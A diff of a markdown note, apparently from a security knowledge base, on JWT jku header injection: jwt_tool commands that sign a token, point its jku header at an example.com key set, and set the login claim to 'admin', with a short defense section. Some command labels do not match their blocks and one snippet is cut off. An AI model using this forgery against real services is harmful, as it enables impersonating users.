@@ -40,11 +40,15 @@ This procedure involves signing a JWT token with a private key and injecting a m
 
 This technique can be used by an attacker to gain access to sensitive information or systems by impersonating a legitimate user.
 
+ 
+
 ## Requirements
 
 1. Access to a JWKS endpoint
 
 1. Knowledge of the private key used to sign the JWT token
+
+ 
 
 ## Defense
 
@@ -54,18 +58,30 @@ This technique can be used by an attacker to gain access to sensitive informatio
 
 1. Implement proper access controls and authentication mechanisms to prevent unauthorized access to the JWKS endpoint.
 
+ 
+
 ## Objectives
 
 1. Gain access to sensitive information or systems by impersonating a legitimate user.
+
+ 
 
 # Instructions
 
 1. Replace JWT_HERE with the JWT token you want to sign.
 
+ 
+
+
+
 **Code**: [[python3 jwt_tool.py JWT_HERE -X s
 python3 jwt_tool]]
 
+
+
 > This command signs the JWT token with a private key and injects a malicious jku header pointing to the attacker's JWKS endpoint.
+
+
 
 **Command** ([[Decode JWT]]):
 
@@ -73,17 +89,31 @@ python3 jwt_tool]]
 python3 jwt_tool.py JWT_HERE -X s
 ```
 
+
+
+
+
 **Command** ([[Verify JWT signature with JWKS endpoint]]):
 
 ```bash
 python3 jwt_tool.py JWT_HERE -X s -ju http://example.com/jwks.json
 ```
 
+
+
 2. 
+
+ 
+
+
 
 **Code**: [[{"typ":"JWT","alg":"RS256", "jku":"https://example]]
 
+
+
 > This command deconstructs a JWT token into its header and payload, showing the jku header and the claims included in the token.
+
+
 
 **Command** ([[Sign JWT with RS256 algorithm]]):
 
@@ -91,17 +121,27 @@ python3 jwt_tool.py JWT_HERE -X s -ju http://example.com/jwks.json
 {"typ":"JWT","alg":"RS256", "jku":"https://example.com/jwks.json", "kid":"id_of_jwks"}
 ```
 
+
+
+
+
 **Command** ([[Add login information to JWT]]):
 
 ```bash
 {"login":"admin"}
 ```
 
+
+
+
+
 **Command** ([[Sign JWT with new private key and export public key]]):
 
 ```bash
 [Signed with new Private key; Public key exported]
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -132,3 +172,5 @@ python3 jwt_tool.py JWT_HERE -X s -ju http://example.com/jwks.json
 - [[JWKS - jku header injection]]
 - [[JWT Claims]]
 - [[JWT - JSON Web Token]]
+
+
